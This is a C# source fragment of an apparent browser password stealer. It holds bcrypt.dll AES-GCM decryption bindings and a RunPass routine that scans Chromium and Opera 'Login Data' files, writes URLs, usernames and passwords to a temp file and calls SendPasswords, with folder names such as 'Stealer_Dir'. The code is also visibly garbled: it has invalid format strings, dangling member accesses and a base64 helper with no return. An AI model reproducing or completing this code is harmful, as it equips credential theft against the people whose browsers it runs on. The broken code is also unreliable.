                public const uint BCRYPT_PAD_PSS = 8;
                public const uint BCRYPT_PAD_OAEP = 4;

                public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

                public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
                public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
                public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
                public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
                public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
                public static readonly string BCRYPT_AES_ALGORITHM = "AES";

                public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

                public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
                public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

                public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

                [StructLayout(LayoutKind.Sequential)]
                public struct BCRYPT_PSS_PADDING_INFO
                {
                    public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
                    {
                        this.pszAlgId = pszAlgId;
                        this.cbSalt = cbSalt;
                    }

                    [MarshalAs(UnmanagedType.LPWStr)]
                    public string pszAlgId;
                    public int cbSalt;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
                {
                    public int cbSize;
                    public int dwInfoVersion;
                    public IntPtr pbNonce;
                    public int cbNonce;
                    public IntPtr pbAuthData;
                    public int cbAuthData;
                    public IntPtr pbTag;
                    public int cbTag;
                    public IntPtr pbMacContext;
                    public int cbMacContext;
                    public int cbAAD;
                    public long cbData;
                    public int dwFlags;

                    public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
                    {
                        dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                        cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                        if (iv != null)
                        {
                            cbNonce = iv.Length;
                            pbNonce = Marshal.AllocHGlobal(cbNonce);
                            Marshal.Copy(iv, 0, pbNonce, cbNonce);
                        }

                        if (aad != null)
                        {
                            cbAuthData = aad.Length;
                            pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                            Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                        }

                        if (tag != null)
                        {
                            cbTag = tag.Length;
                            pbTag = Marshal.AllocHGlobal(cbTag);
                            Marshal.Copy(tag, 0, pbTag, cbTag);

                            cbMacContext = tag.Length;
                            pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                        }
                    }

                    public void Dispose()
                    {
                        if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                        if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                        if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                        if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
                    }
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct BCRYPT_KEY_LENGTHS_STRUCT
                {
                    public int dwMinLength;
                    public int dwMaxLength;
                    public int dwIncrement;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct BCRYPT_OAEP_PADDING_INFO
                {
                    public BCRYPT_OAEP_PADDING_INFO(string alg)
                    {
                        pszAlgId = alg;
                        pbLabel = IntPtr.Zero;
                        cbLabel = 0;
                    }

                    [MarshalAs(UnmanagedType.LPWStr)]
                    public string pszAlgId;
                    public IntPtr pbLabel;
                    public int cbLabel;
                }

                [DllImport("bcrypt.dll")]
                public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                                      [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                                      [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                                      uint dwFlags);

                [DllImport("bcrypt.dll")]
                public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

                [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
                public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

                [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
                internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


                [DllImport("bcrypt.dll")]
                public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                                 IntPtr hImportKey,
                                                                 [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                                 out IntPtr phKey,
                                                                 IntPtr pbKeyObject,
                                                                 int cbKeyObject,
                                                                 byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                                 int cbInput,
                                                                 uint dwFlags);

                [DllImport("bcrypt.dll")]
                public static extern uint BCryptDestroyKey(IntPtr hKey);

                [DllImport("bcrypt.dll")]
                internal static extern uint BCryptDecrypt(IntPtr hKey,
                                                          byte[] pbInput,
                                                          int cbInput,
                                                          ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                          byte[] pbIV,
                                                          int cbIV,
                                                          byte[] pbOutput,
                                                          int cbOutput,
                                                          ref int pcbResult,
                                                          int dwFlags);
            }

            private static string FormatPassword(Password pPassword)
            {
                return String.Format("Url: {|0|}\nUsername: {|1|}\nPassword: {|2|}\n", pPassword.sUrl., pPassword.sUsername., pPassword.sPassword.);
            }

            public static void RunPass()
            {
                foreach (string sPath in Paths.sChromiumPswPaths)
                {
                    sPath = string.Empty;
                    string sFullPath;
                    if (sPath.Contains("Opera Software"))
                    {
                        sFullPath = Paths.appdata + sPath;
                    }
                    else
                    {
                        sFullPath = Paths.lappdata + sPath;
                    }

                    if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
                        {

                            List<Password> pPasswords = GetPasswords(sProfile + "\\Login Data");

                            string Stealer_Dir = Handler.ExploitDir;
                            if (pPasswords.Count > 0)
                            {

                                foreach (Password pass in pPasswords)
                                {
                                    File.WriteAllText(tempFolder + "\\passwords.txt", FormatPassword(pass));

                                }


                            }
                        }

                }
                SendPasswords();

            }



        }

        public static string SussyBaka(string base64EncodedData)
        {
            System.Convert.FromBase64String(base64EncodedData);
            System.Text.Encoding.UTF8.GetString(/*bytes*/);
        }
    }
}
